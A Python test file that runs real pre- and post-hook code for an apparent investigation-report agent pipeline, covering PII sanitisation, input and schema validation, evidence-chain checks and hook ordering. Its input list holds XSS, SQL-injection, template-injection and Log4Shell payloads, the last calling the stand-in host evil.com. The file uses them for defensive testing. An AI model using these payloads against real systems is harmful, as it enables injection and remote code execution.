"""
Empirical hook tests — E1 (pre-hooks) and E2 (post-hooks).
Runs real hook code against controlled inputs. No mock of the hooks themselves.
"""
from __future__ import annotations

import sys
import tempfile
import json
from pathlib import Path
from dataclasses import dataclass

_ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(_ROOT))

from simulation.empirical_fixtures import make_intake, make_evidence_payload


# ---------------------------------------------------------------------------
# Result model
# ---------------------------------------------------------------------------

@dataclass
class HookTestResult:
    test_id: str
    hook: str
    input_desc: str
    outcome: str          # "BLOCKED" | "PASSED" | "MUTATED" | "EXCEPTION" | "IMPORT_ERROR"
    detail: str
    confirmed_sim_finding: str | None   # SIM-N if this validates a Phase 1 claim


# ---------------------------------------------------------------------------
# E1.1 — sanitize_pii full coverage
# ---------------------------------------------------------------------------

PII_INPUTS = [
    ("passport_number",      "passport: AB123456"),
    ("bank_account",         "account number: 1234567890123456"),
    ("ssn",                  "SSN: 123-45-6789"),
    ("credit_card",          "card: 4111111111111111"),
    ("iban_uae",             "iban: AE070331234567890123456"),
    ("xss_script",           "<script>alert(1)</script>"),
    ("sql_injection",        "'; DROP TABLE cases;--"),
    ("xss_img",              "<img src=x onerror=alert(1)>"),
    ("jinja_template",       "{{7*7}}"),
    ("log4shell",            "${jndi:ldap://evil.com/x}"),
    ("null_bytes",           "\x00\x01\x02"),
    ("literal_null",         "null"),
    ("literal_undefined",    "undefined"),
    ("literal_none",         "None"),
    ("normal_text",          "The client is based in Dubai."),
]


def run_e1_pii_tests() -> list[HookTestResult]:
    results = []
    try:
        from hooks.pre_hooks import sanitize_pii
    except ImportError as e:
        return [HookTestResult("E1.1-import", "sanitize_pii", "import",
                               "IMPORT_ERROR", str(e), "SIM-05..14")]

    for label, value in PII_INPUTS:
        payload = {
            "description": value,
            "case_id": "TEST-001",
            "workflow": "investigation_report",
        }
        try:
            result = sanitize_pii(dict(payload), {})
            out_val = result.get("description", value)
            was_mutated = out_val != value

            if was_mutated:
                outcome = "MUTATED"
                detail = f"Stripped to: {repr(out_val)[:60]}"
                sim_ref = None
            else:
                outcome = "PASSED"
                # Determine if this is a PII value that SHOULD have been stripped
                pii_labels = {"passport_number", "bank_account", "ssn", "credit_card",
                               "iban_uae", "null_bytes"}
                if label in pii_labels:
                    detail = f"PII PASSED THROUGH UNCHANGED: {repr(value)[:60]}"
                    sim_ref = "SIM-05..14"
                else:
                    detail = f"Non-PII value passed through (expected): {repr(value)[:40]}"
                    sim_ref = None

            results.append(HookTestResult(
                f"E1.1-{label}", "sanitize_pii", label, outcome, detail, sim_ref
            ))
        except Exception as ex:
            results.append(HookTestResult(
                f"E1.1-{label}", "sanitize_pii", label, "EXCEPTION", str(ex)[:120], None
            ))

    return results


# ---------------------------------------------------------------------------
# E1.2 — validate_input boundary test
# ---------------------------------------------------------------------------

def run_e1_validate_input_tests() -> list[HookTestResult]:
    results = []
    try:
        from hooks.pre_hooks import validate_input
        from core.hook_engine import HookVetoError
    except ImportError as e:
        return [HookTestResult("E1.2-import", "validate_input", "import",
                               "IMPORT_ERROR", str(e), None)]

    cases = [
        ("valid",           {"case_id": "TEST-001", "workflow": "investigation_report"}),
        ("empty_case_id",   {"case_id": "",          "workflow": "investigation_report"}),
        ("none_case_id",    {"case_id": None,         "workflow": "investigation_report"}),
        ("empty_workflow",  {"case_id": "TEST-001",   "workflow": ""}),
        ("none_workflow",   {"case_id": "TEST-001",   "workflow": None}),
        ("both_empty",      {"case_id": "",            "workflow": ""}),
        ("missing_case_id", {"workflow": "investigation_report"}),
        ("missing_workflow",{"case_id": "TEST-001"}),
    ]

    for label, payload in cases:
        try:
            validate_input(dict(payload), {})
            outcome = "PASSED"
            expected_block = label != "valid"
            detail = ("SHOULD HAVE BLOCKED — empty/missing required field reached backend"
                      if expected_block else "Correctly passed valid payload")
            sim_ref = None
        except HookVetoError as e:
            outcome = "BLOCKED"
            detail = str(e)[:100]
            sim_ref = None
        except Exception as ex:
            outcome = "EXCEPTION"
            detail = str(ex)[:100]
            sim_ref = None

        results.append(HookTestResult(f"E1.2-{label}", "validate_input", label,
                                      outcome, detail, sim_ref))
    return results


# ---------------------------------------------------------------------------
# E1.3 — Full pre-hook chain via HookEngine.run_pre()
# ---------------------------------------------------------------------------

def run_e1_prehook_chain_tests() -> list[HookTestResult]:
    results = []
    try:
        from core.hook_engine import HookEngine, HookVetoError
        from hooks.pre_hooks import PRE_HOOKS
    except ImportError as e:
        return [HookTestResult("E1.3-import", "HookEngine.run_pre", "import",
                               "IMPORT_ERROR", str(e), None)]

    engine = HookEngine()
    for name, fn in PRE_HOOKS:
        engine.register_pre(name, fn)

    variants = [
        ("valid_en",        {"case_id": "T001", "workflow": "investigation_report",
                             "description": "Normal text", "language": "en"}),
        ("missing_case_id", {"workflow": "investigation_report", "description": "x"}),
        ("pii_in_desc",     {"case_id": "T001", "workflow": "investigation_report",
                             "description": "card: 4111111111111111", "language": "en"}),
        ("arabic_lang",     {"case_id": "T001", "workflow": "investigation_report",
                             "description": "test", "language": "ar"}),
        ("bad_language",    {"case_id": "T001", "workflow": "investigation_report",
                             "description": "test", "language": "zh"}),
        ("empty_workflow",  {"case_id": "T001", "workflow": "",
                             "description": "test", "language": "en"}),
    ]

    for label, payload in variants:
        try:
            result = engine.run_pre(dict(payload), {"case_id": payload.get("case_id", "")})
            # Check for mutations
            original_desc = payload.get("description", "")
            result_desc = result.get("description", original_desc)
            lang_normalised = result.get("language") != payload.get("language")
            meta_attached = "_meta" in result

            details = []
            if result_desc != original_desc:
                details.append(f"description mutated: {repr(original_desc)[:30]}→{repr(result_desc)[:30]}")
            if lang_normalised:
                details.append(f"language normalised: {payload.get('language')}→{result.get('language')}")
            if meta_attached:
                details.append("_meta attached")

            results.append(HookTestResult(
                f"E1.3-{label}", "HookEngine.run_pre", label,
                "PASSED",
                "; ".join(details) if details else "passed unchanged",
                None,
            ))
        except Exception as e:
            from core.hook_engine import HookVetoError
            outcome = "BLOCKED" if isinstance(e, HookVetoError) else "EXCEPTION"
            results.append(HookTestResult(
                f"E1.3-{label}", "HookEngine.run_pre", label,
                outcome, str(e)[:120], None,
            ))

    return results


# ---------------------------------------------------------------------------
# E2.1 — validate_schema boundary test
# ---------------------------------------------------------------------------

def run_e2_validate_schema_tests() -> list[HookTestResult]:
    results = []
    try:
        from hooks.post_hooks import validate_schema
        from core.hook_engine import HookVetoError
        from schemas.artifacts import JuniorDraft
        from simulation.empirical_fixtures import make_junior_handoff
    except ImportError as e:
        return [HookTestResult("E2.1-import", "validate_schema", "import",
                               "IMPORT_ERROR", str(e), "SIM-03")]

    base_output = make_junior_handoff("good")["output"]

    variants = [
        ("valid_full",          base_output),
        ("missing_findings",    {**base_output, "findings": None}),
        ("empty_findings_list", {**base_output, "findings": []}),
        ("empty_citations",     {**base_output, "citations": []}),
        ("extra_unknown_field", {**base_output, "UNKNOWN_EXTRA": "value"}),
        ("missing_summary",     {k: v for k, v in base_output.items() if k != "summary"}),
        ("missing_citations",   {k: v for k, v in base_output.items() if k != "citations"}),
    ]

    ctx = {"case_id": "TEST-001", "agent": "junior",
           "artifact_type": "output", "schema_cls": JuniorDraft}

    for label, output_dict in variants:
        payload = {"output": output_dict}
        try:
            validate_schema(payload, dict(ctx))
            results.append(HookTestResult(
                f"E2.1-{label}", "validate_schema", label,
                "PASSED", "Schema accepted payload", "SIM-03",
            ))
        except HookVetoError as e:
            results.append(HookTestResult(
                f"E2.1-{label}", "validate_schema", label,
                "BLOCKED", str(e)[:120], "SIM-03",
            ))
        except Exception as ex:
            results.append(HookTestResult(
                f"E2.1-{label}", "validate_schema", label,
                "EXCEPTION", str(ex)[:120], "SIM-03",
            ))

    return results


# ---------------------------------------------------------------------------
# E2.2 — enforce_evidence_chain test (highest-value)
# ---------------------------------------------------------------------------

def run_e2_evidence_chain_tests() -> list[HookTestResult]:
    results = []
    try:
        from hooks.post_hooks import enforce_evidence_chain
        from core.hook_engine import HookVetoError
    except ImportError as e:
        return [HookTestResult("E2.2-import", "enforce_evidence_chain", "import",
                               "IMPORT_ERROR", str(e), "SIM-01")]

    def _run(label: str, payload: dict, workflow: str, agent: str,
             expect_blocked: bool | None = None) -> HookTestResult:
        ctx = {"case_id": "TEST-001", "agent": agent, "workflow": workflow,
               "artifact_type": "output"}
        try:
            enforce_evidence_chain(payload, ctx)
            outcome = "PASSED"
            detail = "Hook did not block"
            if expect_blocked is True:
                detail += " — UNEXPECTED: should have blocked"
        except Exception as e:
            from core.hook_engine import HookVetoError
            outcome = "BLOCKED" if isinstance(e, HookVetoError) else "EXCEPTION"
            detail = str(e)[:120]
            if expect_blocked is False:
                detail += " — UNEXPECTED: should not have blocked"

        return HookTestResult(
            f"E2.2-{label}", "enforce_evidence_chain", label,
            outcome, detail, "SIM-01",
        )

    # Case 1: valid — all evidence IDs exist and are permissible
    p1 = make_evidence_payload(valid_evidence=True)
    results.append(_run("valid_evidence", p1, "investigation_report", "partner", expect_blocked=False))

    # Case 2: evidence ID not in evidence_items
    p2 = make_evidence_payload(valid_evidence=True)
    p2["output"]["finding_chains"][0]["supporting_evidence"] = ["E-NONEXISTENT-999"]
    results.append(_run("bad_evidence_id", p2, "investigation_report", "partner", expect_blocked=True))

    # Case 3: non-permissible evidence referenced
    p3 = make_evidence_payload(non_permissible=True)
    results.append(_run("non_permissible_evidence", p3, "investigation_report", "partner", expect_blocked=True))

    # Case 4: empty supporting_evidence []
    p4 = make_evidence_payload(valid_evidence=True)
    p4["output"]["finding_chains"][0]["supporting_evidence"] = []
    results.append(_run("empty_supporting_evidence", p4, "investigation_report", "partner"))

    # Case 5: workflow not in evidence_chain list (policy_sop)
    p5 = make_evidence_payload(valid_evidence=False)
    results.append(_run("non_evidence_workflow", p5, "policy_sop", "partner", expect_blocked=False))

    # Case 6: agent is "pm" (hook should skip — only fires for partner)
    p6 = make_evidence_payload(non_permissible=True)
    results.append(_run("pm_agent_skips", p6, "investigation_report", "pm", expect_blocked=False))

    return results


# ---------------------------------------------------------------------------
# E2.3 — persist_artifact + extract_citations ordering (SIM-16)
# ---------------------------------------------------------------------------

def run_e2_hook_ordering_test() -> list[HookTestResult]:
    results = []
    try:
        from hooks.post_hooks import persist_artifact, extract_citations
        from core.hook_engine import HookVetoError
        from simulation.empirical_fixtures import make_junior_handoff
    except ImportError as e:
        return [HookTestResult("E2.3-import", "hook_ordering", "import",
                               "IMPORT_ERROR", str(e), "SIM-16")]

    with tempfile.TemporaryDirectory() as tmp:
        tmp_path = Path(tmp)
        case_dir = tmp_path / "cases" / "TEST-001"
        case_dir.mkdir(parents=True)

        # Monkey-patch CASES_DIR temporarily
        import config
        import tools.file_tools as ft
        orig_cases = config.CASES_DIR
        orig_ft_cases = ft.CASES_DIR
        config.CASES_DIR = tmp_path / "cases"
        ft.CASES_DIR = tmp_path / "cases"

        try:
            payload = make_junior_handoff("good")
            ctx = {"case_id": "TEST-001", "agent": "junior",
                   "artifact_type": "output", "workflow": "investigation_report"}

            # Step 1: persist_artifact
            artifact_written = False
            try:
                persist_artifact(payload, dict(ctx))
                artifact_files = list(case_dir.glob("*.json"))
                artifact_written = len(artifact_files) > 0
                artifact_detail = f"artifact written: {[f.name for f in artifact_files]}"
            except Exception as e:
                artifact_detail = f"persist_artifact failed: {e}"

            results.append(HookTestResult(
                "E2.3-persist", "persist_artifact", "write_artifact",
                "PASSED" if artifact_written else "EXCEPTION",
                artifact_detail, "SIM-16",
            ))

            # Step 2: extract_citations with malformed source_url (empty string)
            payload_bad_citations = dict(payload)
            payload_bad_citations["output"] = dict(payload["output"])
            payload_bad_citations["output"]["citations"] = [
                {"source_name": "Test", "source_type": "authoritative",
                 "retrieved_at": "2026-04-21", "excerpt": "test",
                 "confidence": "high", "source_url": ""}  # empty URL — the gap
            ]

            citations_index = tmp_path / "cases" / "TEST-001" / "citations_index.json"
            citations_before = citations_index.exists()

            try:
                extract_citations(payload_bad_citations, dict(ctx))
                citations_after = citations_index.exists()
                if citations_after:
                    idx_content = json.loads(citations_index.read_text())
                    detail = f"citations_index written with {len(idx_content)} entries"
                else:
                    detail = "citations_index NOT written — citations silently lost (SIM-16 CONFIRMED)"
                outcome = "PASSED"  # Hook didn't raise — confirms silent failure
            except Exception as e:
                detail = f"extract_citations raised: {e}"
                outcome = "EXCEPTION"

            results.append(HookTestResult(
                "E2.3-citations_gap", "extract_citations", "empty_source_url",
                outcome, detail, "SIM-16",
            ))

            # Step 3: Confirm artifact exists but citations may be lost
            artifact_after = list(case_dir.glob("*.json"))
            if artifact_written and not citations_index.exists():
                gap_confirmed = "SIM-16 CONFIRMED: artifact written, citations_index absent"
            elif artifact_written and citations_index.exists():
                gap_confirmed = "SIM-16 REFUTED: both artifact and citations_index written"
            else:
                gap_confirmed = "Inconclusive"

            results.append(HookTestResult(
                "E2.3-ordering_verdict", "hook_ordering", "persist_before_citations",
                "PASSED", gap_confirmed, "SIM-16",
            ))

        finally:
            config.CASES_DIR = orig_cases
            ft.CASES_DIR = orig_ft_cases

    return results


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

def run_all_hook_tests() -> dict[str, list[HookTestResult]]:
    return {
        "E1.1_pii_sanitisation":   run_e1_pii_tests(),
        "E1.2_validate_input":     run_e1_validate_input_tests(),
        "E1.3_prehook_chain":      run_e1_prehook_chain_tests(),
        "E2.1_validate_schema":    run_e2_validate_schema_tests(),
        "E2.2_evidence_chain":     run_e2_evidence_chain_tests(),
        "E2.3_hook_ordering":      run_e2_hook_ordering_test(),
    }
